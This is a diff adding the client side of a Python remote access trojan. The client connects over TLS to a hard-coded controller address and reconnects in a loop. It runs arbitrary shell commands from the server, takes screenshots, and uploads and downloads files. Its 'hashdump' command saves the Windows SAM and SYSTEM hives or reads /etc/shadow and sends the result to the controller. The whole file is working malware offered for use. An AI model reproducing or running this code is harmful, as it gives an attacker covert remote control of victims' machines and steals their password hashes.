@@ -1,0 +1,137 @@
+import socket
+import ssl
+import subprocess
+import time
+import base64
+import threading
+import os
+import io
+import sys
+
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
+
+from utils.system_info import SystemInfo
+from utils.file_upload import FileUpload
+from utils.file_download import FileDownload
+from utils.file_search import FileSearch
+from utils.network_info import NetworkInfo
+from utils.command_help import CommandHelp
+
+try:
+    import pyscreenshot
+except ImportError:
+    print("[-] Error: pyscreenshot module not found. Install it using 'pip install pyscreenshot'")
+    sys.exit(1)
+
+def check_privileges():
+    if os.name == 'nt':
+        try:
+            is_admin = os.getuid() == 0
+        except AttributeError:
+            import ctypes
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    else:
+        is_admin = os.geteuid() == 0
+    return is_admin
+
+class CLIENT:
+    SOCK = None
+
+    def __init__(self, ip, port):
+        self.ipaddress = ip
+        self.port = port
+
+    def send_data(self, data, encode=True):
+        if encode:
+            self.SOCK.sendall(base64.b64encode(data.encode('utf-8')))
+        else:
+            self.SOCK.sendall(base64.b64encode(data))
+
+    def execute(self, command):
+        data = command.decode('utf-8').split(" ", 1)
+        if data[0] == "shell":
+            try:
+                result = subprocess.check_output(data[1], shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+            except subprocess.CalledProcessError as e:
+                result = str(e)
+            self.send_data(result)
+        elif data[0] == "screenshot":
+            screenshot = pyscreenshot.grab()
+            buffer = io.BytesIO()
+            screenshot.save(buffer, format='PNG')
+            self.send_data(buffer.getvalue(), encode=False)
+        elif data[0] == "sysinfo":
+            sys_info = SystemInfo()
+            self.send_data(sys_info.get_data())
+        elif data[0] == "download":
+            if len(data) > 1:
+                FileDownload.download(self.SOCK, data[1])
+            else:
+                self.send_data("Error: No file specified for download.")
+        elif data[0] == "upload":
+            if len(data) > 1:
+                FileUpload.upload(self.SOCK, data[1])
+            else:
+                self.send_data("Error: No file specified for upload.")
+        elif data[0] == "hashdump":
+            self.hashdump()
+        elif data[0] == "search":
+            if len(data) > 1:
+                result = FileSearch.search_file(data[1])
+                self.send_data(result)
+            else:
+                self.send_data("Error: No filename specified for search.")
+        elif data[0] == "ipconfig":
+            result = NetworkInfo.get_ipconfig()
+            self.send_data(result)
+        elif data[0] == "help":
+            result = CommandHelp.get_help()
+            self.send_data(result)
+
+    def hashdump(self):
+        if os.name == 'nt':
+            try:
+                result = subprocess.check_output("reg save HKLM\\SAM sam && reg save HKLM\\SYSTEM system", shell=True)
+                self.send_data("SAM and SYSTEM hive saved.")
+            except subprocess.CalledProcessError as e:
+                self.send_data(f"Error: {str(e)}")
+        else:
+            try:
+                with open('/etc/shadow', 'r') as file:
+                    shadow_data = file.read()
+                self.send_data(shadow_data)
+            except Exception as e:
+                self.send_data(f"Error: {str(e)}")
+
+    def acceptor(self):
+        while True:
+            try:
+                command = base64.b64decode(self.SOCK.recv(4096)).decode('utf-8')
+                if command:
+                    threading.Thread(target=self.execute, args=(command.encode(),)).start()
+            except Exception as e:
+                print(f"[DEBUG] Connection closed: {str(e)}")
+                break
+
+    def engage(self):
+        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+        context.check_hostname = False
+        context.load_verify_locations(cafile="../certificate/server.crt")
+        while True:
+            try:
+                with socket.create_connection((self.ipaddress, self.port)) as sock:
+                    with context.wrap_socket(sock, server_hostname=self.ipaddress) as ssock:
+                        self.SOCK = ssock
+                        print("[DEBUG] Connected to server")
+                        self.acceptor()
+            except Exception as e:
+                print(f"[DEBUG] Connection failed: {str(e)}")
+                time.sleep(5)
+
+if __name__ == "__main__":
+    if not check_privileges():
+        print("[-] Error: This script must be run as root/admin.")
+        sys.exit(1)
+
+    client = CLIENT('192.168.1.115', 8888)
+    client.engage()
